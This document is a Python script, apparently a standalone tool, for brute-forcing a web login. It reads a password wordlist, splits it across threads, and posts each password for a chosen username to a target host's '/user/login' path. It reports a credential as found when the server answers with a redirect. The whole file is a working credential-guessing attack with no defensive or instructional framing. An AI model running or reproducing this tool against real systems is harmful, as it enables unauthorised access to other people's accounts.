import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

def brute_force_login(target_host, username, password_list_path, num_threads=1):
    login_url = f"http://{target_host}/user/login"

    # list of passwords from a file
    with open(password_list_path, 'r') as file:
        password_list = file.read().splitlines()

    # split password list to chunks
    chunk_size = (len(password_list) + num_threads - 1) // num_threads
    password_chunks = [password_list[i:i + chunk_size] for i in range(0, len(password_list), chunk_size)]

    def attempt_login(password_chunk):
        for password in password_chunk:
            data = {
                'username': username,
                'password': password,
            }

            try:
                response = requests.post(login_url, data=data, allow_redirects=False)

                # if status_code is 302, then we authenticated
                if response.status_code == 302:
                    print(f"Good: {username} - {password}")
                    return True

            except requests.RequestException as e:
                print(f"Error: {e}")

        return False

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(attempt_login, password_chunk) for password_chunk in password_chunks]

        for future in as_completed(futures):
            if future.result():
                # cancel all other threads if we found correct pass
                executor.shutdown(wait=False)
                break


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force login script")
    parser.add_argument("target_host", help="Target host address")
    parser.add_argument("username", help="Username to test")
    parser.add_argument("password_list", help="Path to the password list file")
    parser.add_argument("--num_threads", type=int, default=1, help="Number of threads (default: 1)")

    args = parser.parse_args()

    brute_force_login(args.target_host, args.username, args.password_list, args.num_threads)
